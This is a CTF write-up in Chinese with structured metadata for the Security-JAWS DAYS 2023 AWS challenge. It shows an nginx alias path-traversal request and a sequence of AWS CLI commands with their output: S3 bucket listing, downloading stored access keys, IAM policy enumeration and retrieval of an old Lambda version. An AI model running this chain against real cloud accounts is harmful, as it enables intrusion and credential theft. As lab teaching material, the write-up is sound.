---
title: Security-JAWS DAYS CTF Writeups
contest: Security-JAWS DAYS
year: 2023
difficulty: hard
vuln_type: web_unknown
tags:
- aws-pentest
- s3-bucket
- iam-policy
- lambda-invoke
- nginx-alias-lfi
- cloud-ctf
attack_chain:
- nginx alias /assets 路径穿越 /assets../secret/.htpasswd
- 读 htpasswd → 上传 aws 配置
- aws s3 ls 列出 13 个桶 (backup-37szjp8pny7xx01 等)
- 下载 dboperator_accessKeys.csv 拿到 dboperator 凭据
- aws configure 配置 profile
- aws sts get-caller-identity 确认身份
- aws iam list-attached-user-policies 看 dboperator 策略
- 查策略 v6 版本允许 lambda:InvokeFunction arn:aws:lambda:*:*:function:db-buckup*
- aws lambda get-function --qualifier 1 拿到老版本 location
- 反编译老版本 lambda 代码找 RDS endpoint
- aws rds describe-db-instances 拿数据库凭据
- 最终连接数据库读 flag
key_payload: aws lambda get-function --function-name 'arn:aws:lambda:ap-northeast-1:055450064556:function:db-buckup' --qualifier 1
one_liner: Security-JAWS DAYS 2023 AWS 渗透综合题：nginx alias LFI → S3 桶列 → IAM 越权 → Lambda 老版本下载 → RDS 提权。
lesson: Lambda function 多版本管理是真实风险点；旧版本代码常包含硬编码 endpoint/凭据。
quality: high
full_path: Security-JAWS_DAYS_CTF_Writeups.full.md
meta_path: Security-JAWS_DAYS_CTF_Writeups.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: Security-JAWS DAYS CTF Writeups。Security-JAWS DAYS 2023 AWS 渗透综合题：nginx alias LFI → S3 桶列 → IAM 越权 → Lambda 老版本下载 → RDS 提权。。关键路径：nginx alias /assets 路径穿越 /assets../secret/.htpasswd → 读 htpasswd → 上...
category: web
subcategory: web_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/132405.html
reasoning_chain:
- 看到 nginx 配置 location /assets alias /usr/share/static/ → 触发点：alias 路径穿越
- 动作：GET /assets../secret/.htpasswd → 观察：拿到 htpasswd 文件
- htpasswd 含 AccessKeyId/SecretAccessKey/Token → 动作：写入 ~/.aws/credentials
- aws s3 ls --profile ctf → 观察：13 个桶
- 备份桶含 dboperator_accessKeys.csv → 假设：换 dboperator profile → 动作：aws configure
- aws iam list-attached-user-policies → 观察：策略 v6 允许 lambda:InvokeFunction on db-buckup*
- aws lambda get-function --qualifier 1 → 观察：拿到老版本 location 含 RDS endpoint
- 反编译老版本 lambda → 拿 RDS 凭据 → mysql 连接 → flag
failed_attempts:
- 试图直接 list lambda function → 失败：当前 dboperator 策略只允许 db-buckup*
- 试图看现版本 lambda 代码 → 失败：新版本不含硬编码 endpoint
key_observations:
- nginx alias 漏写 trailing slash 是经典 LFI (/assets../secret/)
- Lambda function 多版本管理是真实风险；旧版本代码常含硬编码 endpoint/凭据
- AWS 凭据三件套 (AccessKeyId+SecretAccessKey+SessionToken) 缺一不可
- AWS S3 桶名带前缀 backup/camouflagedrop 是题面常见命名套路
prerequisites:
- AWS CLI 配置 (configure/profile)
- S3/IAM/Lambda/RDS 服务基本命令
- nginx alias 路径穿越原理
- Lambda 版本管理 (--qualifier)
---
# Security-JAWS DAYS CTF Writeups

> 原文: https://www.ctfiot.com/132405.html
> ID: 132405


```
location /assets {
 alias /usr/share/static/;
 }
GET /assets../secret/.htpasswd HTTP/1.1
Host: apjweb.scjdaysctf2023.net
Connection: close
location ~^/admin/proxy/(?.*?)/(?.*)$ {
 proxy_pass http://$proxy_host/$proxy_path;
 proxy_set_header Host $proxy_host;
 }
"AccessKeyId" : "[REDACTED]",
 "SecretAccessKey" : "[REDACTED]",
 "Token" : "[REDACTED]",
[ctf-hard-aws-pentesting-journey]
aws_access_key_id = [REDACTED]
aws_secret_access_key = [REDACTED]
aws_session_token = [REDACTED]
$ aws s3 ls --profile ctf-hard-aws-pentesting-journey
2023-08-13 23:13:07 backup-37szjp8pny7xx01
2023-08-26 22:43:13 camouflagedrop-wxhqft4lqf-assets-wxhqft4lqf-assets
2023-08-26 22:39:22 camouflagedrop-wxhqft4lqf-web-wxhqft4lqf-static
2023-08-22 20:16:14 cdk-hnb659fds-assets-055450064556-ap-northeast-1
2023-08-25 03:05:46 file-storage-afeffefespntbaiw7o5
2023-08-06 21:55:59 himituno-bucket1
2023-08-06 21:58:33 himituno-bucket2
2023-08-06 23:08:46 himituno-bucket3
2023-08-27 02:41:30 my-backup-file-ulxmhiw3jroec7sclynr06fkvhqssf
2023-08-22 20:56:47 s3misssignurl-t6j4qj4r-assets-t6j4qj4r-assets-bucket
2023-08-22 20:52:31 s3misssignurl-t6j4qj4r-web-t6j4qj4r-static-host-bucket
2023-08-24 04:24:09 totemo-kawaii-neko-no-namae-ha-lise-desu
2023-08-27 01:18:59 ulxmhiw3jroec7sclynr06fkvhqssf

$ aws s3 ls s3://backup-37szjp8pny7xx01 --profile ctf-hard-aws-pentesting-journey
 PRE dbbackup/
2023-08-14 03:02:43 99 dboperator_accessKeys.csv

$ aws s3 cp s3://backup-37szjp8pny7xx01 . --profile ctf-hard-aws-pentesting-journey --recursive
$ aws configure --profile ctf-hard-aws-pentesting-journey-dboperator
AWS Access Key ID [None]: [REDACTED]
AWS Secret Access Key [None]: [REDACTED]
Default region name [None]: ap-northeast-1
Default output format [None]:

$ aws sts get-caller-identity --profile ctf-hard-aws-pentesting-journey-dboperator
{
 "UserId": "[REDACTED]",
 "Account": "[REDACTED]",
 "Arn": "arn:
aws:
iam::
055450064556:
user/dboperator"
}

$ aws iam list-attached-user-policies --user-name dboperator --profile ctf-hard-aws-pentesting-journey-dboperator
{
 "AttachedPolicies": [
 {
 "PolicyName": "dboperator",
 "PolicyArn": "arn:
aws:
iam::
055450064556:
policy/dboperator"
 }
 ]
}

$ aws iam get-policy --policy-arn arn:
aws:
iam::
055450064556:
policy/dboperator --profile ctf-hard-aws-pentesting-journey-dboperator
{
 "Policy": {
 "PolicyName": "dboperator",
 "PolicyId": "[REDACTED]",
 "Arn": "arn:
aws:
iam::
055450064556:
policy/dboperator",
 "Path": "/",
 "DefaultVersionId": "v6",
 "AttachmentCount": 1,
 "PermissionsBoundaryUsageCount": 0,
 "IsAttachable": true,
 "CreateDate": "2023-08-13T18:18:19+00:00",
 "UpdateDate": "2023-08-13T18:57:09+00:00",
 "Tags": []
 }
}

$ aws iam get-policy-version --version-id v6 --policy-arn arn:
aws:
iam::
055450064556:
policy/dboperator --profile ctf-hard-aws-pentesting-journey-dboperator
{
 "PolicyVersion": {
 "Document": {
 "Version": "2012-10-17",
 "Statement": [
 {
 "Effect": "Allow",
 "Action": [
 "lambda:
List*",
 "lambda:
GetFunction",
 "lambda:
InvokeFunction"
 ],
 "Resource": "arn:
aws:
lambda:ap-northeast-1:
055450064556:
function:db-buckup*"
 },
 {
 "Effect": "Allow",
 "Action": [
 "iam:
Get*",
 "iam:
List*"
 ],
 "Resource": [
 "arn:
aws:
iam::
055450064556:
policy/dboperator",
 "arn:
aws:
iam::
055450064556:
user/dboperator"
 ]
 }
 ]
 },
 "VersionId": "v6",
 "IsDefaultVersion": true,
 "CreateDate": "2023-08-13T18:57:09+00:00"
 }
}

$ aws lambda get-function --function-name 'arn:
aws:
lambda:ap-northeast-1:
055450064556:
function:db-buckup' --profile ctf-hard-aws-pentesting-journey-dboperator

"Location": "[REDACTED]"
$ aws lambda list-versions-by-function --function-name 'db-buckup' --profile ctf-hard-aws-pentesting-journey-dboperator

"Version": "1",
"Version": "2",

$ aws lambda get-function --function-name 'arn:
aws:
lambda:ap-northeast-1:
055450064556:
function:db-buckup' --profile ctf-hard-aws-pentesting-journey-dboperator --qualifier 1
...
"Location": "[REDACTED]"
```
